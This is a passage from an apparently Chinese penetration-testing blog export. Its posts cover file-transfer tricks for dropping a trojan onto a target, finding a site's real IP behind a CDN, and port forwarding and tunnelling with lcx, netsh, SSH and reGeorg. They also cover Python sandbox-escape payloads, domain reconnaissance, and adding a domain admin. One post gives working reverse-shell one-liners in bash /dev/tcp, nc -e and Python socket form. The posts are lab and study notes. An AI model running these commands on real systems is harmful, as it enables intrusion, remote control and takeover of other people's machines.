xxx.xx.xxx.xxx\1.py(远程tftp服务器上的文件) 0x09 bitsadmin 文件下载bitsadmin是windows下的一个命令行工具1bitsadmin /transfer name(这个随便写，是任务名称) http://192.168.43.68:8000/1.py c:\users\pino\1.py 0xA Wget 文件下载1wget http://192.168.43.68:8000/1.py 0xB netcat 文件下载攻击者在linux下输入命令1cat file|nc -l 1234 这样把文件file的内容重定向到了攻击者的1234端口，无论谁访问攻击者的ip的这个端口，都能下载到文件了 1nc host_ip 1234 &gt; file 0xC Windows 共享 文件下载1net use x: \\192.156.1.17\temp$ &quot;password&quot; /user:username $符号这里是在本地隐藏，写不写都行 0x0D Notepad 文件下载这个姿势很神奇。首先打开notepad，就是我们常说的记事本，点击文件-》打开，在文件名称内输入完整的URL，回合，就会发现记事本中的内容就是我们访问的URL的文本内容。 0x0E 使用powershell nishang 进行文件下载nishang 是一个很不错的powershell渗透框架，在github上能够找到，里面有很多实用的渗透脚本，这里我们可以用ExeToText脚本，将想要下载的exe文件转换成txt，在用记事本打开，然后复制其中的内容，通过rdp剪贴板复制到目标机器上的txt文本，再通过TextToExe脚本转换为exe就好了。 0x0F 实用csc工具实现类文件下载通常在渗透的过程中我们下载是为了将我们的木马传到目标机器上，因此我们可以另转思路，将木马的源码写好，直接在目标及其上编译就好了。在Windows下，c的编译器默认是在C:\Windows\Microsoft.NET\framework\version，version的话，不同位数的机器不一样，看情况而定，里面的csc.exe就是了。使用下面的命令1csc.exe /out:c:\users\pino\evil.exe c:\users\pino\evil.c]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>后渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[绕过CDN获取真实IP]]></title>
    <url>%2F2018%2F06%2F10%2F%E7%BB%95%E8%BF%87CDN%E8%8E%B7%E5%8F%96%E7%9C%9F%E5%AE%9EIP%2F</url>
    <content type="text"><![CDATA[0x01 CDN在渗透过程中，经常会遇到网站使用了CDN，而CDN的虚假ip往往会给我们造成各种困难，这里我搜集了很多资料，总结一下关于绕过CDN获取真实IP的方法。 0x02 识别CDN那么在绕过CDN之前，必须要先识别网站是否使用了CDN 不同地区ping网站 对于一个域名来说，如果我们使用不同地区的ip来ping它，如果得到的ip是不一样的，那么就可以判断出它使用了CDN了，因为CDN是一种遵循就近原则的机制。 使用多地ping服务 http://ping.chinaz.com/ http://ping.aizhan.com/ http://ce.cloud.360.cn/ http://tools.fastweb.com.cn/Index/Ping 使用nslookup 如果返回了多个ip可以判断使用了CDN 使用在线网站查询 http://www.cdnplanet.com/tools/cdnfinder/ http://www.ipip.net/ip.html 0x03 绕过CDN nslookup法 1nslookup www.xxx.com 8.8.8.8 格式是 nslookup 主域名 国外冷门的dns由于国内很多CDN提供商可能只提供国内服务，而对国外不提供服务，因此通过国外的dns就可能解析到真实的ip（注：这里8.8.8.8不算是国外冷门dns） 查看历史dns记录 可以通过查看历史的dns记录来判断真实ip，因为在使用CDN之前应该就是真实的ip在线查询网站： https://toolbar.netcraft.com/site_report https://dnsdb.io/zh-cn/ https://x.threatbook.cn/ http://toolbar.netcraft.com/site_report?url= http://viewdns.info/ 查询子域名 很多时候，由于CDN服务比较昂贵，因此一些网站只给主站配置了CDN服务，因此可以谷歌子域名，看看对应ip是不是 使用国外ip解析域名 其实原理跟nslookup方法差不多，如果有国外的vps的话，直接ping域名，看看能否有真实ip 目标敏感文件泄漏 通过网站的一些敏感文件，或者phpinfo之类的探针来获取真实ip RSS订阅 邮件订阅 有的服务器本地自带sendmail（邮件传输代理程序）注册之后，会主动发一封邮件给我们，打开邮件的源代码,你就能看到服务器的真实ip了。有的大型互联网网站会有自己的Mailserver.但是应该会在一个网段，扫下C段地址就行。 DDOS把CDN流量打完，就有真实IP了（不可取） 想办法让网站访问我们自己的服务器，从日志中获取真实ip 利用命令执行漏洞啊，ssrf等等]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>CDN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用VMware进行端口映射（模拟外网访问内网）]]></title>
    <url>%2F2018%2F06%2F10%2F%E5%88%A9%E7%94%A8VMware%E8%BF%9B%E8%A1%8C%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84%EF%BC%88%E6%A8%A1%E6%8B%9F%E5%A4%96%E7%BD%91%E8%AE%BF%E9%97%AE%E5%86%85%E7%BD%91%EF%BC%89%2F</url>
    <content type="text"><![CDATA[0x01 实验材料两台笔记本，vmware workstation软件，安装好的ubuntu虚拟机并且搭建好了web服务 0x02 开始我在ubuntu虚拟机里搭建了web服务器，并在/var/www/html目录下新建了phpinfo.php，代码如下123&lt;?phpphpinfo();?&gt; 我在ubuntu本地访问一下，成功 这里我的web端口设为了8088，不是默认的80端口 然后就要开始设置vmware了。选择编辑 -&gt; 虚拟机网络编辑器，选择VMnet8，类型是NAT模式，配置如图 这里重点是NAT设置中的端口转发选项，主机端口6666，当然也可以是别的端口，虚拟机IP地址设置为ubuntu虚拟机的ip地址（这里我把虚拟机的ip地址设置为了静态的IP了，方便做实验嘛~如何设置可以到我的Linux文集中找到相关文章） 设置好了NAT设置之后，还要在虚拟机设置中把网络连接选项为自定义模式，并选择VMnet8，具体如下图 最后，笔记本开启热点，点击右下角的wifi图标，有个网络设置（win10是这样的） 我另一台笔记本已经连接上热点了，ip地址为192.168.137.134，这里当作外网ip，然后这里我是将开启热点的电脑当作一台路由器了，ip地址通过ipconfig命令查看，是192.168.137.1，然后通过访问1http://192.168.137.1:6666/phpinfo.php 就发现访问到了处于内网的web服务器了！ 然后本次实验的网络拓扑图可以理解为这样： 因此可以说明通过端口映射是可以满足外网访问内网的需求的。]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>端口映射</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[端口映射]]></title>
    <url>%2F2018%2F06%2F10%2F%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84%2F</url>
    <content type="text"><![CDATA[0x01 端口映射什么是端口映射呢？端口映射就是将外网IP映射到内网IP，使得外网用户通过访问这个外网IP就能够获得对应的内网服务器的服务，这么说可能比较抽象，下面会说的更详细一些。 如上面我画的图片，这里假设内网用户访问百度。那么这里正常来说内网用户是无法访问处于外网的百度服务器的，但是譬如校园网，明明是在局域网内，但是为什么还是可以访问百度呢？这里就用到了端口映射了。 实际上，我们所处的内网中，通常有一个“出口”，就是网关，它可能是路由器，或者交换机之类的东西，而他通过端口映射来让我们访问外网。具体地说： 拿路由器为例，路由器至少有两种类型的插口，一个LAN口，一个WAN口，大家可以那一个路由器看一看，这里LAN口是连我们自己的电脑的，而WAN口，在家里的话就是连宽带的那根线，那么我们的电脑就是在内网中了——一个由路由器形成的内网环境。当我们要访问百度的时候，实际上路由器中会形成一个端口映射关系，就像图中那样，我们的内网IP对应外网IP的一个端口，不同的端口可以使得很多内网用户与外网做映射，这样就形成了一一对应的关系了，因此访问百度的时候，百度也就可以知道谁访问了它，然后将响应返回给内网用户。 而当外网用户想要访问内网服务器的时候，也是用过端口映射关系，通过访问外网IP加特定的端口，就可以直接访问到跟那个端口有映射关系的内网IP了。 0x02 端口映射分类端口映射可以分为两类，动态映射、静态映射。感觉关系有点像DHCP分配IP地址一样，动态的就是当映射关系会在一方关机之后，下次再连接的时候，映射关系会改变。而静态端口映射就是绑定了映射关系，就算关机重启之后绑定的关系还是不会变的。]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>端口映射</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用lcx进行访问内网]]></title>
    <url>%2F2018%2F06%2F10%2F%E5%88%A9%E7%94%A8lcx%E8%BF%9B%E8%A1%8C%E8%AE%BF%E9%97%AE%E5%86%85%E7%BD%91%2F</url>
    <content type="text"><![CDATA[0x01 前言这周开始准备学习内网渗透的知识，昨天利用Vmware搭建了域环境，今天做了一个小实验，利用lcx端口转发来访问内网服务器。这里需要一个外网ip，所以去阿里云买了一个服务器，学生价9.9一个月还是挺不错的~ 0x02 操作环境内网服务器ip：192.168.80.3 端口3389外网ip：x.x.x.x 端口：51（这里需要注意的是购买阿里云服务器之后一定要在安全组里定义一个开放入口的端口，否则的话是连接不到的，我就被坑了很久。。） 0x03 具体步骤首先这里假设已经拿到了服务器的webshell了，那么就上传一个lcx.exe到肉鸡上，在终端输入1lcx.exe -slave x.x.x.x 51 192.168.80.3 3389 这里意思就是将内网192.168.80.3的3389端口转发到外网x.x.x.x的51端口 然后再本机上（注意这里本机需要外网ip，否则会失败）的终端输入1lcx.exe -listen 51 10000 这里意思是在本机上监听51端口并连接到10000端口（可以用别的端口）本机需要10000端口是没有被其他程序使用的，可以使用命令：1netstat -an 查看 最后win+R，输入mstsc打开远程桌面，输入127.0.0.1:10000就可以连接到肉鸡了~~ P.S 要有一个需要注意的是，做实验的时候，肉鸡记得把远程桌面功能打开呀！ ##0x04 参考文献 http://www.freebuf.com/sectool/126967.html]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用netsh进行端口转发]]></title>
    <url>%2F2018%2F06%2F10%2F%E5%88%A9%E7%94%A8netsh%E8%BF%9B%E8%A1%8C%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%2F</url>
    <content type="text"><![CDATA[0x01 简介NetSH (Network Shell) 是windows系统本身提供的功能强大的网络配置命令行工具。故我们可以使用netsh进行内网端口转发。思考了一下，发现这个是当我们进入内网的时候可以使用这个工具，好像外网访问内网是不行的（我觉得是这样的(╯▽╰ )），但是lcx就可以外网访问内网呀~ 0x02 使用方法添加端口转发1234netsh interface portproxy add v4tov4 listenaddress=&lt;ip&gt; listenport=&lt;port&gt; connectaddress=&lt;ip&gt; connectport=&lt;port&gt;netsh interface portproxy add v4tov6 listenaddress=&lt;ip&gt; listenport=&lt;port&gt; connectaddress=&lt;ip&gt; connectport=&lt;port&gt;netsh interface portproxy add v6tov4 listenaddress=&lt;ip&gt; listenport=&lt;port&gt; connectaddress=&lt;ip&gt; connectport=&lt;port&gt;netsh interface portproxy add v6tov6 listenaddress=&lt;ip&gt; listenport=&lt;port&gt; connectaddress=&lt;ip&gt; connectport=&lt;port&gt; 查看已经设置的端口转发12345netsh interface portproxy show allnetsh interface portproxy show v4tov4netsh interface portproxy show v4tov6netsh interface portproxy show v6tov4netsh interface portproxy show v6tov6 修改已经设置的端口转发1234netsh interface portproxy set v4tov4 listenport=&lt;port&gt;netsh interface portproxy set v6tov4 listenport=&lt;port&gt;netsh interface portproxy set v4tov6 listenport=&lt;port&gt;netsh interface portproxy set v6tov6 listenport=&lt;port&gt; 删除已经设置的端口转发1234netsh interface portproxy delete v4tov4 listenport=&lt;port&gt;netsh interface portproxy delete v6tov4 listenport=&lt;port&gt;netsh interface portproxy delete v4tov6 listenport=&lt;port&gt;netsh interface portproxy delete v6tov6 listenport=&lt;port&gt;]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>端口转发</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用reGeog和proxifier进行内网渗透]]></title>
    <url>%2F2018%2F06%2F10%2F%E5%88%A9%E7%94%A8reGeog%E5%92%8Cproxifier%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%2F</url>
    <content type="text"><![CDATA[0x01 reGeorg网上说reGeorg是reDuh的继承者，但是表示reDuh没有用过。。。下载的话Github上有，大概就是这样子滴 0x02 proxifierproxifier就是一个代理工具吧，官网下载后安装就好了 0x03 具体实验这里我选择tunnel.php，将该文件上传到服务器端（已经geshell了），访问一下 有这个表示成功了 然后再本地自己的机器上运行reGeorg中的python文件，命令格式大概是1python reGeorgSocksProxy.py -p 8888 -u http://x.x.x.x/tunnel.php 运行成功后大概是这样子的 然后就是配置proxifier了。首先打开proxifier，选择Profile -&gt; Proxy Server -&gt; add，填写信息如下 注意这里的端口号要与之前的运行python脚本中的port参数一致，然后保存一下然后选择Profile -&gt; ProxificationRules 注意这里被选中的蓝色部分，后面的Action为Direct，默认情况就是这个，检查一下就好了。然后第一行的python.exe第一次使用是没有的，用过后就会出现了，所以没看到的小伙伴不要担心~ 配置好了之后，点击屏幕左下角的开始菜单，输入mstsc，会出现mstsc，右键它，并选择Proxifier -&gt;Proxy Socks5 127.0.0.1 弹出远程桌面的登陆框，输入内网ip即可！]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python_Sandbox_Bypass]]></title>
    <url>%2F2018%2F06%2F05%2FPython-Sandbox-Bypass%2F</url>
    <content type="text"><![CDATA[0x01 基础关于python沙箱逃逸的基础之前的博文写过，如果有不会的可以去看看 点我 0x02 Python Sandbox 一般的沙箱会使用1del __builtins__.__dict__[func] 这种方式来删掉敏感的模块或者函数 0x03 常规的内联函数获取方法12[].__class__.__base__.__subclasses__()[68].__init__.__globals__[&apos;os&apos;].system(&apos;whoami&apos;) //执行任意命令[].classes__.__base__.__subclasses__()[40](&apos;flag.txt&apos;).read() //读取文件 0x04 Bypass Function timeit 12import timeittimeit.timeit(&quot;__import__(&apos;os&apos;).system(&apos;ls&apos;)&quot;,number=1) eval 1eval(&quot;__import__(&apos;os&apos;).system(&apos;whoami&apos;)&quot;) exec 12exec(&quot;__import__(&apos;os&apos;).system(&apos;whoami&apos;)&quot;)exec &quot;__import__(&apos;os&apos;).system(&apos;whoami&apos;)&quot; platform 12platform.os.system(&apos;whoami&apos;)platform.popen(&apos;whoami&apos;).read() execfile 12execfile(&apos;/usr/lib/python2.7/os.py&apos;) //相当于from os import *system(&apos;whoami&apos;) file,open 12file(&apos;/etc/passwd&apos;).read()open(&apos;/etc/passwd&apos;).read() map 12import osmap(os.system,[&apos;whoami&apos;]) //需要import模块 0x05 Bypass reload方法 当del了内建模块的时候可以看看reload有没有被过滤，如果没过滤1reload(__builtins__) 寻找替代函数 可以用之前的0x03 常规的内联函数获取方法找到替代方法 字符加密 可以使用base64、rot-13这种可以可以加解密的方法绕过固定的过滤当然字符串拼接也是可以的 如果是module类型，可以使用 dict .key()来获取方法名 可以使用dir(builtins)查看有哪些内置函数可以使用 不需要globals的payload 1].__class__.__base__.__subclasses__()[59]()._module.linecache.os.system(&apos;whoami&apos;)]]></content>
      <categories>
        <category>Python安全</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>沙箱逃逸</tag>
        <tag>Pyhon安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python沙箱逃逸之基础篇]]></title>
    <url>%2F2018%2F06%2F04%2FPython%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%2F</url>
    <content type="text"><![CDATA[0x01 前言周末去参加了一波国赛的半决赛，发现全部都是python的题，之前还以为会有人把模版改成php的呢，结果都没有。。对于python也不是很熟悉，所以回来之后学习一下。 0x02 Python一般的利用方式一般python沙箱的话都是可以执行python命令的一个环境，因此我们需要知道一些敏感的函数来帮助我们getshell或者读取敏感文件等等 执行系统命令 12345os.system(&apos;whoami&apos;)os.popen(&apos;whoami&apos;)commands.getoutput(&apos;whoami&apos;)commands.getstatusoutput(&apos;whoami&apos;)subprocess.call(&apos;whoami&apos;,shell=True) 读取文件 123456fd = os.open(&apos;flag.txt&apos;,O_RDWR)os.read(fd,1024)--------------------------------------------file(&apos;flag.txt&apos;).read() //file函数python3会移除--------------------------------------------open(&apos;flag.txt&apos;).read() f_string python3.6之后引入的新特性，作用跟format差不多，但是可以执行命令1f&quot;&#123;__import__(&apos;os&apos;).system(&apos;whoami&apos;)&#125;&quot; 当然这些都是常见的利用方式，还有很多利用姿势等你解锁 0x03 Python之import在做沙箱逃逸的时候import是对于getshell是很重要的，因为我们肯定是需要引入其他包的功能来进行命令执行。一般import的用法如下： import关键字 __import__函数 importlib库 123import os__import__(&apos;os&apos;)importlib.import_module(&apos;os&apos;) 0x04 Python之builtin在python中，不用引用直接就能使用的叫做内建模块，对于内建模块来说，我们要区分__builtin__、__builtins__、builtins这三者 对于__builtin__和builts来说，他们的区别在于 __builtin__是对于Python2.x的，而builtins是对于Python3.x的，他们都是内建模块。当我们想使用内建函数，比如chr()的时候，其实是用的__builtins__.chr()的 那么__builtins__和__builtin__又有什么区别呢，其实可以把__builtins__看作是 builtin 的一个引用，但是这个引用还要看作用域 当在__main__作用域的时候，两者没有任何区别，但是想要用__builtin__的时候，必须import才能使用，__builtins__就不用import 当不再__main__作用域的时候__builtins__是 __builtin__.__dict__的引用，是个字典 一般来说，在沙箱中经常会使用12import __builtin__del __builtin__.chr 这种方式把敏感的内建函数删除 0x05 Python之 dict 与 dir()__dict__和dir()都可一查看模块/类/对象的属性和函数，但是并不是所有的模块/对象/类都有 __dict__属性的，所以可以用dir()来获取全部的属性和函数 0x06 Python之__mro__与__base__与__base__在Python中mro可以获取一个类的所有父类的列表(按照方法解析顺序排列)1&quot;&quot;.__class__.__mro__ base返回父类 bases返回父类的tuple 0x07 Python之__subclasses__()之前说的mro是获取父类的列表，那么subclasses就是获取子类的列表了。因此有一个思路就是，获取任意类的父类列表，找到object类，因为所有的类都是继承object类的，所有再使用subclasses来获取子类的列表，这样就能使用所有的类了。 0x09 Python之__globals__globals属性是函数特有的，记录当前文件的全局变量的值，123a=lambda x:x+1a.__globals__a.func_globals //两个返回的内容是一样的 0x08 参考https://xz.aliyun.com/t/52#toc-10http://www.bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/]]></content>
      <categories>
        <category>Python安全</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>沙箱逃逸</tag>
        <tag>Pyhon安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mac下双网卡同时上内网和外网]]></title>
    <url>%2F2018%2F06%2F02%2Fmac%E4%B8%8B%E5%8F%8C%E7%BD%91%E5%8D%A1%E5%90%8C%E6%97%B6%E4%B8%8A%E5%86%85%E7%BD%91%E5%92%8C%E5%A4%96%E7%BD%91%2F</url>
    <content type="text"><![CDATA[有的时候我们可能为了访问内网而给电脑插上了网线，但是默认情况下就只能访问内网了，如果我们这个时候想要访问外网的话，就只能把网线拔了，再访问外网了，实在是太麻烦了，那么今天就介绍一个mac下同时访问内网和外网的方法给大家！ 首先，插上网线，并且同时连接上能够上外网的WIFI 之后打开网络偏好设置 在左侧有个下拉箭头，选择设置服务顺序 然后通过拖动，将wifi服务弄到有线服务的上面 配置好了后就准备配置路由了，开启终端输入 1sudo route -n add -net [内网ip] -netmask [内网ip的掩码] [网管ip]]]></content>
      <categories>
        <category>Mac OS</category>
      </categories>
      <tags>
        <tag>小贴士</tag>
        <tag>Mac OS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[正向代理、反向代理、透明代理]]></title>
    <url>%2F2018%2F05%2F31%2Fo%2F</url>
    <content type="text"><![CDATA[0x01 正向代理1LHost ---&gt; Proxy ---&gt; RHost 正向代理就是LHost想要访问RHost，就向Proxy发送请求，并指定要访问的对象是RHost，然后Proxy再把请求发给RHost，并将RHost返回的消息在转发给LHost，也就是说LHost对于RHost是透明的 0x02 反向代理1LHost &lt;---&gt; Proxy &lt;---&gt; Firewall &lt;---&gt; Rhost 反向代理恰恰相反，可以理解为RHost对于LHost是透明的。LHost访问的是反向代理Proxy，而一般防火墙之允许反向代理与实际的服务器RHost进行交互，也就是说，LHost永远不知道真正为他服务的服务器是哪个，他只知道访问的是反向代理，对于LHost来说，Proxy就是服务器 0x03 透明代理透明代理比较类似于正向代理，差别在于用户不知道透明代理的存在，它改编发送request报文，并传送真实的ip地址。 0x04 使用场景 正向代理 正向代理的最经典场景就是翻墙啦，比如我们想要访问谷歌，直接访问肯定不行，但是我们购买了一个代理服务器，这个代理服务器可以访问谷歌，而我们可以访问代理服务器，这样就顺利的上谷歌啦。 反向代理 隐藏自身 反向代理可以用来隐藏服务器，对于用户来说，他们访问的是反向代理，然后由反向代理通过防火墙与真正的服务器进行通讯，这样真正的服务器对于用户来说是透明的 - 负载均衡 反向代理还可以用来进行负载均衡，当大量用户进行访问的时候，访问的是反向代理，然后由隐藏在后面的某一个服务器进行真正的数据处理，每一次处理的服务器不一定是哪个，从而实现负载均衡 透明代理 透明代理最常见的就是公司里的使用了。例如某公司限制使用QQ，某员工想使用QQ进行通讯时，会发现无法使用，这里就是透明代理的作用，公司在内网和外网之间插了一个透明代理，它会根据规则抓取数据包，遇到QQ的请求就会屏蔽掉，从而限制员工使用QQ通信]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>内网穿透</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSH端口转发]]></title>
    <url>%2F2018%2F05%2F31%2FSSH%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%2F</url>
    <content type="text"><![CDATA[0x01 SSH隧道什么是SSH隧道呢？举个例子，我们都知道，SSH传输数据是加密传输的，可以有效的保证数据的安全，但是telnet是明文传输的，很不安全，尤其是在公网上，一旦监听到就会有很大的危害，所以一般公司的防火墙都会禁止外网通过telnet连接内网的计算机的。那么如果我们想在外面访问公司的计算机怎么办呢？这个时候就可以用到SSH隧道技术，可以保证数据的传输是加密的。通常我们讲的ssh隧道技术其实就是ssh端口转发。 0x02 SSH本地端口转发原理如下图 建立本机独享隧道 将本地9999端口通过192.168.10.1映射到192.168.10.212345ssh -L 9999:192.168.10.2:23 -Nf 192.168.10.1-L 本地端口转发-N 不执行命令或者脚本，否则会等待用户的输入-f 后台执行 建立共享隧道 他人可以通过访问我的9999端口来访问192.168.10.21ssh -g -L 9999:192.168.10.2:23 -Nf 192.168.10.1 0x03 SSH远程端口转发那么当防火墙设置为我们从外面不能直接访问内部网络的服务器，但是内部网络的服务器可以访问外面的时候，就要用到远程端口转发技术了。此时就要在内网跳板计算机上运行命令1ssh -R 9999:192.168.10.2:23 -Nf &lt;外部ip&gt; 这样外部用户只要在自己的机器上使用1telnet 127.0.0.1:9999 就可以访问到内网192.168.10.2的telnet了。 x04 SSH动态端口转发举个场景，存在远程外网服务器233.233.233.233上3000端口运行这一个web1服务，4000端口运行这一个web2服务，5000端口运行这一个web3服务（随便举的例子），然后由于防火墙策略只能用22端口连接外部网络，那么如何才能访问到那个外网服务器上的web服务呢？有的同学一定会说可以使用ssh本地端口转发呀，是的，我们可以在本地运行命令123ssh -L 6666:localhost:3000 root@233.233.233.233 //访问web1服务ssh -L 7777:localhost:4000 root@233.233.233.233 //访问web2服务ssh -L 8888:localhost:5000 root@233.233.233.233 //访问web3服务 这样做是可以的，但是吧，不觉得很麻烦嘛，如果有10个服务要访问呢，就要输入10条命令，那么这样就可以使用SSH动态端口转发功能了，只需要一条命令即可实现多端口访问。这里需要用到SOCKS代理，使用命令1ssh -D localhost:2000 root@233.233.233.233 然后在浏览器中找到设置代理的地方，选择SOCKS代理，选择SOCKS5，SOCKS主机填localhost，端口填2000，这样我们只需要在浏览器中输入localhost:3000或者localhost:4000或者localhost:5000就可以方便又快速的访问三个web服务了。这里的原理就是我们访问本地加端口的请求会被ssh转发到真正的那个地址（这里就是外网服务器），又真正的那个地址来处理这个请求，然后将数据发回来。 0x05 声明这篇文章是我通过查询资料然后根据自己的认知来写的，其中如果有什么我说错的地方希望能评论或者私信我，不胜感激！]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>SSH</tag>
        <tag>内网渗透</tag>
        <tag>内网穿透</tag>
        <tag>端口转发</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常见的反弹shell]]></title>
    <url>%2F2018%2F05%2F31%2F%E5%B8%B8%E8%A7%81%E7%9A%84%E5%8F%8D%E5%BC%B9shell%2F</url>
    <content type="text"><![CDATA[0x01 bash12345受害机命令bash -i &gt;&amp; /dev/tcp/x.x.x.x/1234 0&gt;&amp;1本机命令nc -lvvvp 1234 首先在受害机（192.168.80.133）中开一个终端，输入1bash -i &gt;&amp; /dev/tcp/192.168.80.134/1234 0&gt;&amp;1 然后再本机（192.168.80.134）中开个终端，界面如下 输入如下命令1nc -lvvvp 1234 可以看到终端的标签已经改变了，尝试输入命令可以发现已经得到了一个shell 0x02 netcat如果目标主机有nc -e选项的话，也可以通过-e进行反弹shell还是以刚才的环境来做实验首先，在本机上输入1nc -lvvp 1234 进行监听然后再受害机输入1nc -e /bin/bash 192.168.80.134 1234 发现在本机的终端已经可以执行shell了 但是万一没有-e选项呢，那么还可以用管道进行反弹shell首先在本机开两个端口监听12nc -lvvvp 1234nc -lvvvp 4321 然后受害机输入1nc 192.168.80.134 1234 | /bin/bash | nc 192.168.80.134 4321 得到shell 0x03 Python12345678910python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.80.134&quot;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&apos; 首先在本机输入1nc -lvvvp 1234 在受害机输入1python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.80.134&quot;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&apos; 即可看到反弹了一个shell]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[信息收集-基本命令]]></title>
    <url>%2F2018%2F05%2F31%2F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[0x01 获取当前组的计算机名 1net view 0x02 查看所有域1net view /domain 0x03 从计算机名获取其ipv4地址1ping -n 1 SERVER08-DC -4 0x04 获取域环境的用户名单(执行命令的机器需要有域用户权限)1net user /domain 0x05 获取域组名称1net group /domain 0x06 获取域管理员1net group &quot;Domain Admin&quot; /domain 0x07 添加普通域用户123net user Test m03123. /add /domain格式为：net user 用户名 密码 /add /domain 0x08 将普通域用户变为域管理员1net group &quot;Domain Admins&quot; Test /add /domain 0x09 获取计算机名、用户名、软件版本、工作站域、登陆域1net config Workstation 0x0A 获取域控制器（在多域控制器时，并且只能在域控制器上执行）1net group &quot;Domain controllers&quot; 0x0B 查看域中所有计算机名(但是域控制器不会出现)1net group &quot;Domain computers&quot; 0x0C 跟踪路由1tracert ip]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>渗透测试</tag>
        <tag>信息收集</tag>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[信息收集之定位域]]></title>
    <url>%2F2018%2F05%2F31%2F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8B%E5%AE%9A%E4%BD%8D%E5%9F%9F%2F</url>
    <content type="text"><![CDATA[0x01 查看域时间 1net time /domain 0x02 查看域服务器1nslookup -type=SRV _ldap._tcp. 其中的address就是域服务器 0x03 查看dns服务器1ipconfig /all 0x04 获取域控制器（在多域控制器时，并且只能在域控制器上执行）1net group &quot;Domain controllers&quot; /domain]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>渗透测试</tag>
        <tag>信息收集</tag>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JSONP实现跨域请求]]></title>
    <url>%2F2018%2F05%2F31%2FJSONP%E5%AE%9E%E7%8E%B0%E8%B7%A8%E5%9F%9F%E8%AF%B7%E6%B1%82%2F</url>
    <content type="text"><![CDATA[0x01 前言今天复习了一下有关jsonp相关的攻防知识，突然发现自己对于jsonp的理解只是在书本上的那种，对于其具体的实现还是一知半解的，因此写篇文章记录一下jsonp的实现过程，会附上具体代码滴～ 0x02 JSONP的概念那么什么是JSONP呢，在理解JSONP之前，我们需要知道的是什么是JSON，有过一些web基础的小伙伴一定都听说过这个单词了，JSON是如今用来传输文本的一种很流行的格式，其格式类似这样：1234&#123; &quot;id&quot; : &quot;1&quot;, &quot;name&quot; : &quot;pino&quot;&#125; 而JSONP的话，用一张图片就比较形象的解释了 就是这样喽，多出来了一个单词和一对括号。那么JSONP用来做什么呢？通常来说，是用来跨域的，我们都知道，浏览器是存在一个叫做同源策略的东东，不同源的两个站点理论上是无法进行网络通信的，但是有的时候我们还是需要进行不同源的站点通信，那么就用到了JSONP来进行跨域通信啦。 0x03 JSONP跨域通信的实现JSONP的跨域实现有很多种方式，这里我给大家展示的是两种类型的方式，javascript和jquery，而jquery又有三种方法。 服务端尽管有很多种方式，但是这里服务端的代码是一成不变的，这里我在自己的公网服务器上创建了一个jsonp.php的文件1234567&lt;?php $arr = array(&apos;id&apos;=&gt;1, &apos;name&apos;=&gt;&apos;pino&apos;,&apos;location&apos;=&gt;&apos;china&apos;); $result = json_encode($arr); $callback = $_GET[&apos;callback&apos;]; echo $callback.&quot;($result)&quot;;?&gt; 并且修改自己电脑中的hosts文件，把公网ip对应一个域名，这里我起名为pino.my.com 3.1 前端——Javascript代码 12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;jsonp&lt;/title&gt; &lt;meta content=&quot;text/html; charset=urf-8&quot; 